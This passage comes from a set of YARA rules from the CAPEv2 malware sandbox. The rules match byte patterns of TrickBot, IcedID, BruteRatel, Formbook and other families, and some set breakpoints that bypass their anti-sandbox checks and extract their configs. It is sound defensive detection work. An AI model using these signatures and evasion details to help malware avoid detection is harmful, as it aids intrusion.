		logic_hash = "8f7144d2a989ce8d291af926b292f5f0f7772e707b0e49797eba13ecf91b90bc"
		score = 75
		quality = 70
		tags = ""
		cape_type = "AgentTesla Payload"
		packed = "7f8a95173e17256698324886bb138b7936b9e8c5b9ab8fffbfe01080f02f286c"

	strings:
		$decode1 = {8B 01 8B 40 3C FF 50 10 8B C8 E8 [4] 89 45 CC B8 1A 00 00 00}
		$decode2 = {83 F8 18 75 2? 8B [2-5] D1 F8}
		$decode3 = {8D 4C 0? 08 0F B6 01 [0-3] 0F B6 5? 04 33 C2 88 01 B8 19 00 00 00}

	condition:
		2 of them
}

rule CAPE_Nighthawk
{
	meta:
		description = "NightHawk C2"
		author = "Nikhil Ashok Hegde <@ka1do9>"
		id = "096b9d13-6aa7-5b6e-aaeb-e25aa7c8c53f"
		date = "2022-12-05"
		modified = "2022-12-05"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/Nighthawk.yar#L3-L24"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "2d77912678e06503ffef0e8ed84aa4f9ac74357480d57742fbae619acebfb5f2"
		score = 75
		quality = 70
		tags = ""
		cape_type = "Nighthawk Payload"

	strings:
		$keying_methods = { 85 C9 74 43 83 E9 01 74 1C 83 F9 01 0F 85 }
		$aes_sbox = { 63 7C 77 7B F2 6B 6F C5 30 }
		$aes_inv_sbox = { 52 09 6A D5 30 36 A5 38 BF }

	condition:
		pe.is_pe and for any s in pe.sections : ( s.name == ".profile" ) and all of them
}

rule CAPE_Bumblebee2024
{
	meta:
		description = "BumbleBee 2024"
		author = "enzok"
		id = "ba92b894-912d-593c-acf9-99cb6ad6d61f"
		date = "2024-10-29"
		modified = "2024-10-29"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/BumbleBee.yar#L52-L68"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "db58272c1ba74bc6e6a90bdacf7e8feec94be5da2b5123e0475ce86448f3edb2"
		score = 75
		quality = 70
		tags = ""
		cape_type = "BumbleBee Payload"
		packed = "a20d56ab2e53b3a599af9904f163bb2e1b2bb7f2c98432519e1fbe87c3867e66"

	strings:
		$rc4key = {48 [6] 48 [6] E8 [4] 4C 89 AD [4] 4C 89 AD [4] 4C 89 B5 [4] 4C 89 AD [4] 44 88 AD [4] 48 8D 15 [4] 44 38 2D [4] 75}
		$botidlgt = {4C 8B C1 B? 4F 00 00 00 48 8D 0D [4] E8 [4] 4C 8B C3 48 8D 0D [4] B? 4F 00 00 00 E8 [4] 4C 8B C3 48 8D 0D [4] B? FF 0F 00 00 E8}
		$botid = {90 48 [6] E8 [4] 4C 89 AD [4] 4C 89 AD [4] 4C 89 B5 [4] 4C 89 AD [4] 44 88 AD [4] 48 8D 15 [4] 44 38 2D [4] 75}
		$port = {4C 89 6D ?? 4C 89 6D ?? 4c 89 75 ?? 4C 89 6D ?? 44 88 6D ?? 48 8D 05 [4] 44 38 2D [4] 75}
		$dga1 = {4C 89 75 ?? 4C 89 6D ?? 44 88 6D ?? 48 8B 1D [4] 48 8D 0D [4] E8 [4] 8B F8}
		$dga2 = {48 8D 0D [4] E8 [4] 8B F0 4C 89 6D ?? 4C 89 6D ?? 4C 89 75 ?? 4C 89 6D ?? 44 88 6D ?? 48 8D 15 [4] 44 38 2D [4] 75}

	condition:
		$rc4key and all of ( $botid* ) and 2 of ( $port , $port , $dga1 , $dga2 )
}

rule CAPE_Trickbot
{
	meta:
		description = "TrickBot Payload"
		author = "sysopfb & kevoreilly"
		id = "dc88eadd-7b84-5bd0-96d1-aad480632bee"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/TrickBot.yar#L1-L20"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "47cc2070b43957601a72745329a9d14fb3fbfd4d2b31cacc35d4ac750dde31ea"
		score = 75
		quality = 70
		tags = ""
		cape_type = "TrickBot Payload"

	strings:
		$str1 = "<moduleconfig>*</moduleconfig>" ascii wide
		$str2 = "group_tag" ascii wide
		$str3 = "client_id" ascii wide
		$code1 = {8A 11 88 54 35 F8 46 41 4F 89 4D F0 83 FE 04 0F 85 7E 00 00 00 8A 1D ?? ?? ?? ?? 33 F6 8D 49 00 33 C9 84 DB 74 1F 8A 54 35 F8 8A C3 8D 64 24 00}
		$code2 = {8B 4D FC 8A D1 02 D2 8A C5 C0 F8 04 02 D2 24 03 02 C2 88 45 08 8A 45 FE 8A D0 C0 FA 02 8A CD C0 E1 04 80 E2 0F 32 D1 8B 4D F8 C0 E0 06 02 45 FF 88 55 09 66 8B 55 08 66 89 11 88 41 02}
		$code3 = {0F B6 54 24 49 0F B6 44 24 48 48 83 C6 03 C0 E0 02 0F B6 CA C0 E2 04 C0 F9 04 33 DB 80 E1 03 02 C8 88 4C 24 40 0F B6 4C 24 4A 0F B6 C1 C0 E1 06 02 4C 24 4B C0 F8 02 88 4C 24 42 24 0F}
		$code4 = {53 8B 5C 24 18 55 8B 6C 24 10 56 8B 74 24 18 8D 9B 00 00 00 00 8B C1 33 D2 F7 F3 41 8A 04 2A 30 44 31 FF 3B CF 75 EE 5E 5D 5B 5F C3}
		$code5 = {50 0F 31 C7 44 24 04 01 00 00 00 8D 0C C5 00 00 00 00 F7 C1 F8 07 00 00 74 1B 48 C1 E2 20 48 8B C8 48 0B CA 0F B6 C9 C1 E1 03 F7 D9 C1 64 24 04 10 FF C1 75 F7 59 C3}
		$code6 = {53 8B 5C 24 0C 56 8B 74 24 14 B8 ?? ?? ?? ?? F7 E9 C1 FA 02 8B C2 C1 E8 1F 03 C2 6B C0 16 8B D1 2B D0 8A 04 1A 30 04 31 41 3B CF 75 DD 5E 5B 5F C3}
		$code7 = {B8 ?? ?? 00 00 85 C9 74 32 BE ?? ?? ?? ?? BA ?? ?? ?? ?? BF ?? ?? ?? ?? BB ?? ?? ?? ?? 03 F2 8B 2B 83 C3 04 33 2F 83 C7 04 89 29 83 C1 04 3B DE 0F 43 DA}

	condition:
		all of ( $str* ) or any of ( $code* )
}

rule CAPE_Trickbot_Permadll_UEFI_Module
{
	meta:
		description = "Detects TrickBot Banking module permaDll"
		author = "@VK_Intel | Advanced Intelligence"
		id = "ba104164-0a1a-5a4c-8312-7653f7818e96"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/TrickBot.yar#L22-L38"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "491115422a6b94dc952982e6914adc39"
		logic_hash = "564055f56fd19bed8900e6d451ba050b4e9013a9208a3bdc3d3d563567d225d2"
		score = 75
		quality = 70
		tags = ""

	strings:
		$module_cfg = "moduleconfig"
		$str_imp_01 = "Start"
		$str_imp_02 = "Control"
		$str_imp_03 = "FreeBuffer"
		$str_imp_04 = "Release"
		$module = "user_platform_check.dll"
		$intro_routine = { 83 ec 40 8b ?? ?? ?? 53 8b ?? ?? ?? 55 33 ed a3 ?? ?? ?? ?? 8b ?? ?? ?? 56 57 89 ?? ?? ?? a3 ?? ?? ?? ?? 39 ?? ?? ?? ?? ?? 75 ?? 8d ?? ?? ?? 89 ?? ?? ?? 50 6a 40 8d ?? ?? ?? ?? ?? 55 e8 ?? ?? ?? ?? 85 c0 78 ?? 8b ?? ?? ?? 85 ff 74 ?? 47 57 e8 ?? ?? ?? ?? 8b f0 59 85 f6 74 ?? 57 6a 00 56 e8 ?? ?? ?? ?? 83 c4 0c eb ??}

	condition:
		6 of them
}

rule CAPE_Icedid
{
	meta:
		description = "IcedID Payload"
		author = "kevoreilly, threathive"
		id = "439342be-a1e6-5656-8813-5cebb0e88e98"
		date = "2021-12-16"
		modified = "2021-12-16"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/IcedID.yar#L1-L18"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "e60ccbab7a360020744eba65961156ca3e2ae9cf23671014f913d71c1a96a331"
		score = 75
		quality = 45
		tags = ""
		cape_type = "IcedID Payload"

	strings:
		$crypt1 = {8A 04 ?? D1 C? F7 D? D1 C? 81 E? 20 01 00 00 D1 C? F7 D? 81 E? 01 91 00 00 32 C? 88}
		$crypt2 = {8B 44 24 04 D1 C8 F7 D0 D1 C8 2D 20 01 00 00 D1 C0 F7 D0 2D 01 91 00 00 C3}
		$crypt3 = {41 00 8B C8 C1 E1 08 0F B6 C4 66 33 C8 66 89 4? 24 A1 ?? ?? 41 00 89 4? 20 A0 ?? ?? 41 00 D0 E8 32 4? 32}
		$download1 = {8D 44 24 40 50 8D 84 24 44 03 00 00 68 04 21 40 00 50 FF D5 8D 84 24 4C 01 00 00 C7 44 24 28 01 00 00 00 89 44 24 1C 8D 4C 24 1C 8D 84 24 4C 03 00 00 83 C4 0C 89 44 24 14 8B D3 B8 BB 01 00 00 66 89 44 24 18 57}
		$download2 = {8B 75 ?? 8D 4D ?? 8B 7D ?? 8B D6 57 89 1E 89 1F E8 [4] 59 3D C8 00 00 00 75 05 33 C0 40 EB}
		$major_ver = {0F B6 05 ?? ?? ?? ?? 6A ?? 6A 72 FF 75 0C 6A 70 50 FF 35 ?? ?? ?? ?? 8D 45 80 FF 35 ?? ?? ?? ?? 6A 63 FF 75 08 6A 67 50 FF 75 10 FF 15 ?? ?? ?? ?? 83 C4 38 8B E5 5D C3}
		$stage_2_request_binary = "id="
		$stage_2_request_img = ".png"

	condition:
		any of ( $crypt* , $download* , $major_ver ) and all of ( $stage_2_request_* )
}

rule CAPE_Nitrogenloader
{
	meta:
		description = "Nitrogen Loader"
		author = "enzok"
		id = "43f819a7-50cf-5b0b-97cb-c882ca03083e"
		date = "2025-06-17"
		modified = "2025-06-17"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/NitrogenLoader.yar#L1-L31"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "1c23e702d7b44d531ec3653c759b44fadea332cc7233eb3f817d94dc53a7f814"
		score = 75
		quality = 70
		tags = ""
		cape_type = "NitrogenLoader Loader"
		hash1 = "7b603d63a23201ff0b6ffa9acdd650df9caa1731837d559d93b3d8ce1d82a962"
		hash2 = "50c2afd792bfe2966133ee385054eaae1f73b04e013ef3434ef2407f99d7f037"
		hash3 = "4926dee7da0da522c34ffeebb32f28703fd689a52543332c8d28ccfea223f43a"

	strings:
		$stringaes1 = {63 7c 77 7b f2 6b 6f c5 30 01 67 2b fe d7 ab 76 ca 82 c9 7d fa}
		$stringaes2 = {52 09 6a d5 30 36 a5 38 bf 40 a3 9e 81 f3 d7 fb 7c e3 39 82 9b}
		$string1 = "GetComputerNameExA"
		$string2 = "LoadResource"
		$syscallmakehashes = {48 89 4C 24 ?? 48 89 54 24 ?? 4? 89 44 24 ?? 4? 89 4C 24 ?? 4? 83 EC ?? B? [4] E8 [3] 00}
		$syscallnumber = {49 89 C3 B? [4] E8 [3] 00}
		$syscall = {48 83 C4 ?? 4? 8B 4C 24 ?? 4? 8B 54 24 ?? 4? 8B 44 24 ?? 4? 8B 4C 24 ?? 4? 89 CA 4? FF E3}
		$decryptstr1 = {33 D2 48 8B 04 24 B? 0C 00 00 00 48 F7 F1 48 8B C2 48 C1 E0 02 0F B6 C8 48 8B 44 24 ?? 48 D3 E8 48 25 AB 00 00 00}
		$decryptrsc1 = {48 63 4? 24 ?? 33 D2 48 [0-3] F7 B4 24 [4] 48 8B C2 48 8B 8C 24 [4] 0F BE 04 01}
		$decryptrsc2 = {8B ?? 24 [1-4] 33 C8 8B C1 48 63 4C 24 ?? 48 8B 94 24 [4] 88 04 0A}
		$decryptrsc3 = {8B 8C 24 ?? ?? ?? ?? 2B C8 8B C1 48 63 4C 24 ?? 48 8B 94 24 [4] 88 04 0A}
		$decryptstrs = {33 D2 48 8B 04 24 B9 0C 00 00 00 48 F7 F1 48 8B C2 48 C1 E0 02 0F B6 C8 48 8B 44 24 ?? 48 D3 E8 48 25 AB 00 00 00}
		$taskman_1 = {E8 [4] B9 61 00 00 00 88 84 24 [4] E8 [4] B9 73 00 00 00 88 84 24 [4] E8 [4] B9 6B 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_2 = {B9 4D 00 00 00 88 84 24 [4] E8 [4] B9 61 00 00 00 88 84 24 [4] E8 [4] B9 6E 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_3 = {B9 61 00 00 00 88 84 24 [4] E8 [4] B9 67 00 00 00 88 84 24 [4] E8 [4] B9 65 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_4 = {B9 72 00 00 00 88 84 24 [4] E8 [4] 31 C9 88 84 24 [4] E8 [3] FF}
		$rc4decrypt_1 = {48 89 ?? 4? 89 ?? E8 [4] 4? 8B ?? 24 [1-4] 4? 89 ?? 4? 89 ?? 4? 89 C1 [0-1] 89 ?? E8 [4] 4? 89}
		$rc4decrypt_2 = {E8 [4] 8B ?? 24 [1-4] 4? 89 ?? 48 89 ?? 4? 89 C1 E8 [3] FF}

	condition:
		(2 of ( $string* ) and any of ( $syscall* ) ) or 4 of ( $decrypt* ) or ( 3 of ( $taskman_* ) and all of ( $rc4decrypt_* ) )
}

rule CAPE_Koiloader
{
	meta:
		description = "KoiLoader"
		author = "YungBinary"
		id = "258e8857-7ea6-5098-9949-06d9d83853d4"
		date = "2024-10-25"
		modified = "2024-10-25"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/KoiLoader.yar#L1-L35"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "b462e3235c7578450b2b56a8aff875a3d99d22f6970a01db3ba98f7ecb6b01a0"
		logic_hash = "264a536632f8f11c904b00c9d2e505b3263c733ad8fbc2ef19c25a5ad58cef90"
		score = 75
		quality = 70
		tags = ""
		cape_type = "KoiLoader Payload"

	strings:
		$chunk_1 = {
            68 27 11 68 05
            8B 45 ??
            50
            E8 ?? ?? ?? ??
            83 C4 08
            89 45 ??
            68 15 B1 B3 09
            8B 4D ??
            51
            E8 ?? ?? ?? ??
            83 C4 08
            89 45 ??
            68 B5 96 AA 0D
            8B 55 ??
            52
            E8 ?? ?? ?? ??
            83 C4 08
            89 45 ??
            6A 00
            FF 15 ?? ?? ?? ??
        }

	condition:
		$chunk_1
}

rule CAPE_Blackdropper
{
	meta:
		description = "BlackDropper"
		author = "enzok"
		id = "5cb92b67-d12c-5946-84b1-a9fce4a6d242"
		date = "2024-10-22"
		modified = "2024-10-22"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/data/yara/CAPE/BlackDropper.yar#L1-L17"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "f8026ae3237bdd885e5fcaceb86bcab4087d8857e50ba472ca79ce44c12bc257"
		logic_hash = "c7f7bc740d413b479ebe45611ddfc04f7e4f2978516b2882069b2569c7acdf28"
		score = 75
		quality = 70
		tags = ""
		cape_type = "BlackDropper Payload"

	strings:
		$string1 = "BlackDropperCPP"
		$string2 = "Builder.dll"
		$string3 = "\\Builder.exe"
		$crypt1 = {33 D2 48 8B 44 24 ?? 48 8B 4C 24 ?? 48 F7 F1 48 8B C2 48 8B D0 48 8D 4C 24 ?? E8}
		$crypt2 = {0F BE 00 8B 4C 24 ?? 33 C8 8B C1 88 44 24 ?? 48 8B 54 24 ?? 48 8D 4C 24}
		$crypt3 = {E8 [4] 0F B6 4C 24 ?? 88 08 E9}

	condition:
		2 of ( $string* ) or 2 of ( $crypt* )
}

rule CAPE_Rdtscpantivm
{
	meta:
		description = "RdtscpAntiVM bypass"
		author = "kevoreilly"
		id = "11dc634b-1e2f-55b4-be60-98e51de42d43"
		date = "2021-12-11"
		modified = "2021-12-11"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/RdtscpAntiVM.yar#L1-L11"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "be0f9b52fb630730a38160f4ad2d50b6b4bea5edd82e3ea4d1e257cf7b090910"
		score = 75
		quality = 70
		tags = ""
		cape_options = "nop-rdtscp=1"

	strings:
		$antivm = {46 0F 01 F9 [0-4] 66 0F 6E C6 F3 0F E6 C0 66 0F 2F ?? 73}

	condition:
		any of them
}

rule CAPE_Privateloader
{
	meta:
		description = "PrivateLoader indirect syscall capture"
		author = "kevoreilly"
		id = "3a0b16da-ec84-5761-bcf2-106362c5667d"
		date = "2024-10-04"
		modified = "2024-10-04"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/PrivateLoader.yar#L1-L12"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "204a86bb3743f19fed0fe55ff5ccd716661f7f315b5966a29e434ccb3e160526"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,sysbp=$syscall*-2"
		packed = "075d0dafd7b794fbabaf53d38895cfd7cffed4a3fe093b0fc7853f3b3ce642a4"

	strings:
		$syscall = {48 31 C0 4C 8B 19 8B 41 10 48 8B 49 08 49 89 CA 41 FF E3}

	condition:
		any of them
}

rule CAPE_Mysterysnail
{
	meta:
		description = "MysterySnail anti-sandbox bypass"
		author = "kevoreilly"
		id = "dfeb820a-3101-5588-8348-3b62a6900538"
		date = "2021-10-16"
		modified = "2021-10-16"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/MysterySnail.yar#L1-L11"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "9402dbbbfdd286e2309ee83fc08194f70f73657a3a4e3785dfbcb564dbee86a8"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$anti+62,action0=skip,count=0"

	strings:
		$anti = {F2 0F 10 [3] 66 0F 2F 05 [4] 76 0A 8B [3] FF C0 89 [3] B9 5B 05 00 00 FF 15 [4] E8 [4] 89 [3] 8B [3] 8B [3] 2B C8 8B C1 3B [3] 7E 16}

	condition:
		any of them
}

rule CAPE_Bruteratelsyscall
{
	meta:
		description = "BruteRatel Syscall Bypass"
		author = "kevoreilly"
		id = "0ddc3e0a-c4ca-5342-b029-107ce1f2751e"
		date = "2024-07-22"
		modified = "2024-07-22"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/BruteRatel.yar#L1-L12"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "5ed054b3cd5d2659c250945d55d6adac90945963c34ad2af0f8d7436141e86b6"
		score = 75
		quality = 70
		tags = ""
		cape_options = "sysbp=$syscall1+6,sysbp=$syscall2+8"

	strings:
		$syscall1 = {49 89 CA 4? 89 ?? (41 FF|FF)}
		$syscall2 = {49 89 CA 48 8B 44 24 ?? FF 64 24}

	condition:
		all of them
}

rule CAPE_Bruteratelpacker
{
	meta:
		description = "BruteRatel Outer Encryption Layer"
		author = "kevoreilly"
		id = "631083be-7058-590a-a394-984545f42ad7"
		date = "2024-07-22"
		modified = "2024-07-22"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/BruteRatel.yar#L14-L26"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "2ccb17efe378d034df34d20d7580c58171d0fd11c18fef6c9a23f1ba238514e6"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp1=$outer*,action1=scan,count=0"

	strings:
		$outer = {83 45 F8 01 81 7D F8 FF 00 00 00 7E ?? 83 45 FC 01 8B 45 FC 3B 45 ?? 7E ?? 48}
		$inner = {88 E3 32 1C 0E 88 5C 15 00 48 8D 49 01 48 8D 52 01 38 C1 76 ?? 48 01 CE EB ?? FF}
		$date = {48 8B 17 48 85 D2 0F 85 [2] 00 00 8B 47 08 85 C0 0F 85 [2] 00 00}

	condition:
		($outer ) and not ( $inner ) and not ( $date )
}

rule CAPE_Bruterateldate
{
	meta:
		description = "BruteRatel Date Check Bypass"
		author = "kevoreilly"
		id = "94dd5cf3-ed59-51d6-92c8-aee73fe2926b"
		date = "2024-07-22"
		modified = "2024-07-22"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/BruteRatel.yar#L28-L39"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "88589b2d08aea03565668ff1b9af20b6fe11cda50d867c60db7cb4d1826b0fd7"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp1=$inner*,action1=scan,bp2=$date+6,action2=skip,count=0"

	strings:
		$inner = {88 E3 32 1C 0E 88 5C 15 00 48 8D 49 01 48 8D 52 01 38 C1 76 ?? 48 01 CE EB ?? FF}
		$date = {48 8B 17 48 85 D2 0F 85 [2] 00 00 8B 47 08 85 C0 0F 85 [2] 00 00}

	condition:
		any of them
}

rule CAPE_Bruteratelconfig
{
	meta:
		description = "BruteRatel Config Extraction"
		author = "kevoreilly"
		id = "5ae680b0-5ad2-5e82-87f8-b0af4fec18de"
		date = "2024-07-22"
		modified = "2024-07-22"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/BruteRatel.yar#L41-L51"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "b1815aafec940ab6c8daafc68ccf294845221ada260de5209dcb7e49ccd061c7"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,br1=$decode,count=0,action0=string:eax,typestring=BruteRatel Config"

	strings:
		$decode = {55 57 56 53 48 83 EC ?? 31 C0 48 89 CB 48 89 D7 44 89 C6 44 89 CD 44 39 01 77 ?? 41 8D 48 01 E8 [4] 31 C9}

	condition:
		all of them
}

rule CAPE_Ursnifv3_1
{
	meta:
		description = "Ursnif Config Extraction"
		author = "kevoreilly"
		id = "4170b638-e51b-59c6-956a-50ff82f629ba"
		date = "2023-03-23"
		modified = "2023-03-23"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/UrsnifV3.yar#L1-L16"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "d679546e37ee58087fce75920b2ce4e6d2b9ae55fb1ef80d14ec14309396757c"
		score = 75
		quality = 70
		tags = ""
		cape_options = "br0=$crypto32_1-48,action1=dump:ebx::eax,bp2=$crypto32_3+50,action2=dump:ebx::eax,bp3=$crypto32_4+11,action3=dump:eax::ecx,typestring=UrsnifV3 Config,count=1"
		packed = "75827be0c600f93d0d23d4b8239f56eb8c7dc4ab6064ad0b79e6695157816988"
		packed = "5d6f1484f6571282790d64821429eeeadee71ba6b6d566088f58370634d2c579"

	strings:
		$crypto32_1 = {8B C3 83 EB 01 85 C0 75 0D 0F B6 16 83 C6 01 89 74 24 14 8D 58 07 8B C2 C1 E8 07 83 E0 01 03 D2 85 C0 0F 84 AB 01 00 00 8B C3 83 EB 01 85 C0 89 5C 24 20 75 13 0F B6 16 83 C6 01 BB 07 00 00 00}
		$crypto32_3 = {F6 46 03 02 75 5? 8B 46 10 40 50 E8 [4] 8B D8 89 5C 24 1C 85 DB 74 41 F6 46 03 01 74 53 8B 46 10 89 44 24 1C 8B 46 0C 53 03 C7 E8 [4] 59}
		$crypto32_4 = {C7 44 24 10 01 00 00 00 8B 4E 10 C6 04 08 00 8B 4D ?? 89 01 8B 46 ?? 8B 4D ?? 89 01 8B 44 24 10 5F 5E 5B 8B E5 5D C2 0C 00}
		$cpuid = {8B C4 FF 18 8B F0 33 C0 0F A2 66 8C D8 66 8E D0 8B E5 8B C6 5E 5B 5D C3}

	condition:
		any of ( $crypto32* ) and $cpuid
}

rule CAPE_Formhooka
{
	meta:
		description = "Formbook Anti-hook Bypass"
		author = "kevoreilly"
		id = "6369de74-99eb-57ae-a315-c15f22effc73"
		date = "2025-06-13"
		modified = "2025-06-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Formbook.yar#L1-L14"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "21b8101a7039cfad0e9d49cc1f055bc23a2eb4c973dcda2a81a007e452d77a6d"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp0=$remap_ntdll_0,action0=setedx:ntdll,count0=1,bp1=$remap_ntdll_1,action1=setdst:ntdll,count1=1"
		packed = "9e38c0c3c516583da526016c4c6a671c53333d3d156562717db79eac63587522"
		packed = "b8e44f4a0d92297c5bb5b217c121f0d032850b38749044face2b0014e789adfb"

	strings:
		$remap_ntdll_0 = {33 56 04 8D 86 [2] 00 00 68 F0 00 00 00 50 89 56 ?? E8 [4] 8B [1-5] 6A 00 6A 04 8D 4D ?? 51 6A 07 52 56 E8 [4] 8B 45 ?? 83 C4 20 3B}
		$remap_ntdll_1 = {33 56 0C 8D 86 [2] 00 00 68 F0 00 00 00 50 89 56 ?? E8 [4] 8B [1-5] 6A 00 6A 04 8D 4D ?? 51 6A 07 52 56 E8 [4] 8B 45 ?? 83 C4 20 3B}

	condition:
		any of them
}

rule CAPE_Formhookb
{
	meta:
		description = "Formbook Anti-hook Bypass"
		author = "kevoreilly"
		id = "71797c14-fa5c-5da3-b99d-71435d6c3069"
		date = "2025-06-13"
		modified = "2025-06-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Formbook.yar#L16-L30"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "a844652c1f883548d17b08f8ff5d9927f92dabc09ab6600554eab7cf1dd50ccb"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp0=$entry,action0=scan,hc0=1,bp1=$new_remap,action1=setdst:ntdll,count1=0,bp2=$code+14,count=0"
		packed = "08c5f44d57f5ccc285596b3d9921bf7fbbbf7f9a827bb3285a800e4c9faf6731"

	strings:
		$decode = {B8 67 66 66 66 F7 E? C1 FA 03 8B ?2 C1 E? 1F 03 ?2}
		$entry = {55 8B EC 83 EC ?4 53 56 57 [480-520] 8B E5 5D C3}
		$new_remap = {8B (86 [2] 00 00|46 ??|06) 5F 5E 5B 8B E5 5D C3}
		$code = {8B 4E 18 50 6A 00 51 57 56 E8 9A 18 00 00 8B 55 10 8B 45 0C 8B 0F 83 C4 1C 52 50 FF D1 5F 5E 5D C3}

	condition:
		any of them
}

rule CAPE_Formconfa
{
	meta:
		description = "Formbook Config Extraction"
		author = "kevoreilly"
		id = "f9c3fc92-e2c8-5968-b0f4-80bd8199b7ca"
		date = "2025-06-13"
		modified = "2025-06-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Formbook.yar#L32-L44"
